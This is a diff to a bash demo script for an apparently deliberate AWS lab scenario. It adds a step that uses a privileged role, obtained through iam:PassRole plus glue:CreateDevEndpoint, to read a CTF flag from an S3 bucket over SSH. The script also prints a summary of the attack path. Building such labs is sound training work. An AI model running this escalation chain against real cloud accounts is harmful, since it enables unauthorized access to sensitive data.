@@ -372,12 +372,26 @@ ssh -i ${SSH_KEY_PATH} $SSH_OPTS glue@$ENDPOINT_ADDRESS \
 echo ""
 echo -e "${GREEN}✓ Full bucket access confirmed${NC}\n"
 
+# [EXPLOIT] Step 13: Capture the CTF flag
+echo -e "${YELLOW}Step 13: Capturing CTF flag from S3 bucket${NC}"
+show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/flag.txt -"
+FLAG_VALUE=$(ssh -i ${SSH_KEY_PATH} $SSH_OPTS glue@$ENDPOINT_ADDRESS \
+    "aws s3 cp s3://$BUCKET_NAME/flag.txt -" 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from s3://$BUCKET_NAME/flag.txt${NC}"
+    exit 1
+fi
+echo ""
+
 # Summary
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:PassRole + glue:CreateDevEndpoint)"
@@ -386,7 +400,7 @@ echo "3. Created Glue dev endpoint with privileged role: $TARGET_ROLE"
 echo "4. Waited for endpoint to become ready (~5-10 minutes)"
 echo "5. Connected to endpoint via SSH"
 echo "6. Used role credentials to access sensitive S3 bucket: $BUCKET_NAME"
-echo "7. Achieved: Full access to sensitive data"
+echo "7. Captured CTF flag from s3://$BUCKET_NAME/flag.txt: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (glue:CreateDevEndpoint + iam:PassRole)"
